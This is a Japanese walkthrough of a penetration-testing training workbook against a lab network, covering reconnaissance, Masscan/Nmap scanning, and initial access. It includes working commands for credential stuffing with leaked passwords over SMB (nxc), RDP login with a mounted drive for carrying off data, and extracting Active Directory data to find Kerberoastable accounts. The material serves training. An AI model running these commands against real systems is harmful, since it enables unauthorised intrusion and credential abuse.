# Lab1 Walkthrough

提供された資料に基づく、SEC560 Workbook 1のウォークスルー（手順書）です。このワークブックでは、ペネトレーションテストの初期段階である「偵察（Reconnaissance）」から「スキャン（Scanning）」、そして漏洩した認証情報を用いた「初期アクセス（Initial Access）」までを学習します。

---

## 前提条件・環境準備

一部のラボ（Lab 1.1, 1.3, 1.4）では、ターゲットネットワーク（`10.130.10.0/24`など）へのアクセスが必要となるため、提供されたVPN設定ファイル（`sec560-labs-range.ovpn`）を使用してVPNに接続しておく必要があります。

---

## Lab 1.1: 漏洩情報から侵害への移行（Credential Stuffing to a Breach）

**目的:** 過去のデータ漏洩から得た認証情報を利用して、公開されているRDPサーバーにクレデンシャルスタッフィング攻撃を行い、ネットワークへの初期アクセスを獲得します。

**ステップ 1: シングルファクター（1FA）認証サービスの発見** まずはNmapを使用して、ターゲットであるRDPサーバー（10.130.10.23）の情報を取得し、対象のActive Directoryドメイン名（`hiboxy.com`）を特定します。

```
nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn
```

_結果から、DNSドメイン名が `hiboxy.com` であることが分かります_。

**ステップ 2: 漏洩データ（Breach Data）の検索と成形** 用意された漏洩データのテキストファイルから、ターゲットドメイン（`@hiboxy.com`）を含む行を抽出し、ユーザー名とパスワードのリストをそれぞれ作成します。

```
# ターゲットドメインを含む行を抽出
grep '@hiboxy.com:' breachdata.txt > hiboxy_breachdata.txt

# ユーザー名（@より左側）のリストを作成
cut -d '@' -f1 hiboxy_breachdata.txt > hiboxy_users.txt

# パスワード（:より右側）のリストを作成
cut -d ':' -f2- hiboxy_breachdata.txt > hiboxy_passwords.txt
```

**ステップ 3: SMBに対するクレデンシャルスタッフィング** `nxc`（NetExec）を使用し、作成したリストを用いてターゲットにログインを試行します。RDPよりもSMBに対する試行の方が高速で安定しているため、SMBをターゲットとします。

```
nxc smb -u hiboxy_users.txt -p hiboxy_passwords.txt -d hiboxy.com --continue-on-success --no-bruteforce 10.130.10.23
```

_出力結果から `[+]` と表示された有効なクレデンシャル（例: `hmoore` / `sbishop` / `apena` など）を特定します_。

**ステップ 4: RDPでのログインとデータ抽出** 見つけた有効なクレデンシャルを使用して、Linux VMからRDPクライアント（`xfreerdp`）でターゲットにログインします。この際、自分のローカルディレクトリをターゲットにマウントし、ファイルのやり取りができるようにします。

```
xfreerdp /u:hiboxy\\$RDP_USER /p:"$RDP_PASS" /v:10.130.10.23 /drive:labs,/home/sec560/labs /cert-ignore /size:80% +dynamic-resolution
```

**ステップ 5: ADExplorerスナップショットの持ち出しと分析** RDP接続後、ターゲット機上で `ADExplorer` を実行し、Active Directoryの情報をスナップショットとして保存します。保存したデータをマウントしたドライブ経由でLinux VMへ持ち出し、`jq` コマンドで解析して、後続の攻撃（Kerberoasting）のターゲットとなる「SPN（Service Principal Name）が設定されたアカウント」を特定します。

```
jq '.data[] | select(.Properties.serviceprincipalnames | length > 0) | {name: .Properties.name, spns: .Properties.serviceprincipalnames}' ~/labs/Hiboxy-parsed/dc01.hiboxy.com_*_users.json
```

_これにより、`SVC_SQLSERVICE` などのKerberoast可能なアカウントが特定できます_。

---

## Lab 1.2: 偵察とOSINT（Reconnaissance and OSINT）

**目的:** インターネット上の公開情報（OSINT）のみを利用して、ターゲットのインフラストラクチャやアタックサーフェスをマッピングします。※このラボにVPN接続は不要です。

**ステップ 1: メールの経路とクラウドサービスの確認** 対象ドメインのMXレコードやTXTレコードをDNSで引き、利用しているメールサービス（Microsoft 365やProofPointなど）やサードパーティツールを特定します。

```
# MXレコードの確認（Microsoft 365やProofPointの利用有無がわかる）
Resolve-DnsName -Type MX -Name targetdomain.com

# TXTレコードの確認（SPFや各種クラウドサービスの認証用レコードが含まれる）
Resolve-DnsName -Type TXT -Name targetdomain.com
```

**ステップ 2: パブリックIPスペースの発見** Hurricane ElectricのBGP Toolkitなどを利用して、ターゲット企業が所有するASN（自律システム番号）と、それに関連付けられたIPアドレスレンジを特定します。

**その他の偵察手法**

- **証明書の透明性（CT）ログ:** `crt.sh` などで対象ドメインを検索し、隠れたサブドメインや利用サービスを発見します。
- **ソーシャルメディアの偵察:** LinkedInなどを検索し、組織構造、役職、ユーザー名の推測の基となる従業員名を収集します。

---

## Lab 1.3: Masscan

**目的:** ターゲットネットワーク全体のTCPポートを超高速でスキャンし、アクティブなホストとサービスを特定します。

**ステップ 1: スキャン結果の解析** Masscanでスキャンし、Grep可能な形式（`.gnmap`）で保存した結果ファイルから、特定のサービスが稼働しているホストを抽出します。

```
# ポート53 (DNS) が開いているホストの抽出
grep -w 53 /open /tmp/masscan_10.130.10.0_24_full.gnmap

# ポート25 (SMTP) が開いているホストの抽出とバナー情報の確認
grep -w 'tcp 25' /tmp/masscan_10.130.10.0_24_full.txt
```

これにより、DNSサーバー（例: 10.130.10.4）やメールサーバー（例: 10.130.10.25 / mail01.hiboxy.com）を素早く洗い出すことができます。

---

## Lab 1.4: Nmap

**目的:** Masscanで特定したシステムに対して、Nmapを用いて詳細なサービスバージョンスキャンやOSフィンガープリンティングを実施し、エクスプロイトの標的を絞り込みます。

_(※このラボは、のちに続く詳細なNSE（Nmap Scripting Engine）の活用やGoWitnessによるWebスクリーニング（Lab 2.1など）への準備となります)_

---

**まとめ** Workbook 1を通じて、ターゲットに直接触れない受動的なOSINT偵察から、Masscan/Nmapを用いた能動的なスキャン、そして公開されている情報（漏洩パスワード）を再利用して内部ネットワークへの足場を築くという、攻撃の初期フェーズを体系的に実践することができます。